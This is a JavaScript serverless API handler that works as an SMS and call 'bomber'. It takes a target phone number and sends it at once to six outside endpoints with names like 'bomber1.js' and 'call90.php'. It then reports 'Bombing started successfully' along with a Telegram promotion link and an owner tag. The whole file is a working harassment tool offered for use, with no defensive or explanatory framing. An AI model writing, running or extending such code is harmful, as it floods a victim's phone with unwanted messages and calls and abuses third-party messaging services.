export default async function handler(req, res) {
    // Allow both GET and POST methods
    if (req.method !== "GET" && req.method !== "POST") {
        return res.status(405).json({ error: "Method Not Allowed" });
    }

    // Extract phone from request (GET or POST)
    const phone = req.method === "POST" ? req.body.phone : req.query.phone;

    if (!phone) {
        return res.status(400).json({ error: "Phone number is required." });
    }

    // API endpoints
    const apis = [
        `https://api-kappa-eight-29.vercel.app/bomber1.js?phone=${phone}`,
        `https://api-kappa-eight-29.vercel.app/bomber2.js?phone=${phone}`,
        `https://api-kappa-eight-29.vercel.app/bomber4.js?num=${phone}`,
        `http://mrn-bio.social-networking.me/cobraCll.php?num=${phone}`,
        `https://yousuf323215.serv00.net/call90.php?number=${phone}`,
        `https://api-kappa-eight-29.vercel.app/bomber3.js?phone=${phone}`  // Added API
    ];

    let successCount = 0;
    let errorCount = 0;

    // Function to send requests
    async function sendRequests() {
        const requests = apis.map(api =>
            fetch(api)
                .then(res => res.ok ? successCount++ : errorCount++)
                .catch(() => errorCount++)
        );
        await Promise.all(requests);
    }

    await sendRequests();

    return res.status(200).json({
        phone,
        success: successCount,
        failed: errorCount,
        message: "Bombing started successfully.",
        follow: "https://t.me/termux_command_store",
        owner: "DEMONIC"
    });
}
